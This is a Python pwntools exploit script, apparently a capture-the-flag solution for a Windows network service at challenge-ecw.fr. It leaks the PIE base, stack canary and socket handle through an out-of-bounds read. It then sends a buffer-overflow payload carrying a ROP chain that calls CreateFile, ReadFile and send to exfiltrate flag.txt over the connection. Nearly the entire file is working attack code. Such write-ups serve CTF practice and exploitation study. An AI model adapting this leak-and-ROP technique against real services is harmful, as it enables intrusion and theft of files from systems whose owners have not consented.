#!/usr/bin/python
from struct import pack, unpack
from pwn import remote
from sys import argv
#from pwintools import Remote as remote #for Windows debugging

p = remote("challenge-ecw.fr", 741)
#p = remote("localhost", 1337)

WRITE_OPCODE = "\x01"
LEAK_OPCODE = "\x04"
RETURN_OPCODE = "\x05"

PIE_BASE_OFFSET_FROM_LEAK = 0x2507
LEAK_PIE_OFFSET = 0x106
OFFSET_PIE_JMP_CreateFile = 0x6615
OFFSET_PIE_JMP_ReadFile = 0x662d
OFFSET_PIE_JMP_Send = 0x13FB965E5 - 0x13FB90000 #address - base
OFFSET_PIE_POP_RCX = 0x13603
OFFSET_PIE_POP_RDX = 0x1b4be
OFFSET_PIE_POP_RAX = 0x3a6e
OFFSET_PIE_POP_R8 = 0x3a6d
OFFSET_PIE_MOV_R9 = 0x47777 #mess up rax, rcx, rdx, r8 => TO USE PUT 0 IN RCX AND TARGET VALUE IN R8
OFFSET_PIE_CALL_RAX = 0x69df6
OFFSET_PIE_MOV_RCX_QWORD_RCX = 0x20f6b #burn rax
OFFSET_PIE_MOV_QWORD_RCX_RAX = 0x3ddc3 #burn rax
OFFSET_ADDRESS_RW1 = 0x9d010
OFFSET_ADDRESS_TMP = 0x9d020
OFFSET_ADDRESS_RW2 = 0x9d040
OFFSET_ADDRESS_RW3 = 0x9d070
OFFSET_PIE_TRI_POP = 0x6aeb1
OFFSET_PIE_BI_POP = 0x6aeb3
OFFSET_PIE_FIVE_POP = 0x20206
OFFSET_PIE_SEVEN_POP = 0x20202

LEAK_CANARY_OFFSET = 0x100
LEAK_SOCKET_OFFSET = 0x104

WRITE_ROP_PADDING = "a" * 0x400
#We can use a payload like to write "\x01\x00\x00\x00<len(padding+payload)/8><PADDING+PAYLOAD>"

#Leak PIE part1
p.sendline(LEAK_OPCODE + pack(">i", LEAK_PIE_OFFSET))
PIE_LEAK = p.recv(4)

#Leak PIE part2
p.sendline(LEAK_OPCODE + pack(">i", LEAK_PIE_OFFSET + 1))
PIE_LEAK += p.recv(4)

PIE_LEAK = unpack("<Q", PIE_LEAK)[0]
BASE_PIE = PIE_LEAK - PIE_BASE_OFFSET_FROM_LEAK
print("[+] Leak PIE : 0x%x" % PIE_LEAK)
print("[+] Base PIE : 0x%x" % BASE_PIE)

###########################################################################################

#Leak CANARY part1
p.sendline(LEAK_OPCODE + pack(">i", LEAK_CANARY_OFFSET))
CANARY_LEAK = p.recv(4)

#Leak CANARY part2
p.sendline(LEAK_OPCODE + pack(">i", LEAK_CANARY_OFFSET + 1))
CANARY_LEAK += p.recv(4)

CANARY_LEAK = unpack("<Q", CANARY_LEAK)[0]
print("[+] Leak CANARY : 0x%x" % CANARY_LEAK)

############################################################################################

#Leak Socket Handle
p.sendline(LEAK_OPCODE + pack(">i", LEAK_SOCKET_OFFSET))
SOCKET_LEAK = p.recv(4) + "\x00" * 4

SOCKET_LEAK = unpack("<Q", SOCKET_LEAK)[0]
print("[+] Leak SOCKET HANDLE : 0x%x" % SOCKET_LEAK)

############################################################################################

payload = WRITE_ROP_PADDING
payload += pack("<Q", CANARY_LEAK)

payload += pack("<Q", 0)
payload += pack("<Q", 0) #padding

#Write "flag.txt" in memory
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RAX)
payload += "flag.txt".ljust(8, '\x00')
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_RW1)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_QWORD_RCX_RAX)

payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RAX)
payload += "".ljust(8, '\x00')
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_RW1 + 8)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_QWORD_RCX_RAX) #flag.txt ecrit @adresse1

#Prepare the CreateFile part of the ROP
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", 0)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_R8)
payload += pack("<Q", 0)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_R9) #lp security attribute = null
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_RW1) #filename
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RDX)
payload += pack("<Q", 0x80000000) #desired access mode = GENERIC_READ
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_R8)
payload += pack("<Q", 0) #share mode = null
payload += pack("<Q", BASE_PIE + OFFSET_PIE_JMP_CreateFile)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_SEVEN_POP)
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 3) #create = 3
payload += pack("<Q", 0x80) #file_attribute = normal
payload += pack("<Q", 0) #template_file = null
#CreateFile OK

#Save CreateFile's created handle in a tmp memory
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_TMP)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_QWORD_RCX_RAX) #handle in TMP

#Prepare the ReadFile part of the ROP
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", 0)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_R8)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_RW2)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_R9) #lpNumberOfBytesRead
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_TMP) #file handle loc
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_RCX_QWORD_RCX) #file handle
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RDX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_RW3) #buffer
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_R8)
payload += pack("<Q", 100) #numb of bytes to read
payload += pack("<Q", BASE_PIE + OFFSET_PIE_JMP_ReadFile)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_FIVE_POP)
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #overlapped
#ReadFile OK

#Prepare the Send part of the ROP
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", 0)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_R8)
payload += pack("<Q", 0)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_MOV_R9) #flags
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RCX)
payload += pack("<Q", SOCKET_LEAK) #socket
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_RDX)
payload += pack("<Q", BASE_PIE + OFFSET_ADDRESS_RW3) #buffer
payload += pack("<Q", BASE_PIE + OFFSET_PIE_POP_R8)
payload += pack("<Q", 100) #len
payload += pack("<Q", BASE_PIE + OFFSET_PIE_JMP_Send)
payload += pack("<Q", BASE_PIE + OFFSET_PIE_FIVE_POP)
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #shadow space
payload += pack("<Q", 0) #overlapped
#Send OK


#############################################################################################
#Verify payload first
if len(payload)/8 > 0xff:
	print("[!] Payload too long... Exiting (length = %d)" % (len(payload)/8))
	exit(1)

if '\n' in payload:
	print("[!] Payload contains \\n... Exiting")
	exit(1)

#Send final payload (payload max size = 0xff * 8)
p.send(WRITE_OPCODE + pack(">i", len(payload)/8) + payload)
print("[+] Payload sent...")

#Trigger buffer overflow
p.send(RETURN_OPCODE)
print("[+] FLAG : %s" % p.recv(69))
p.close()
exit(0)



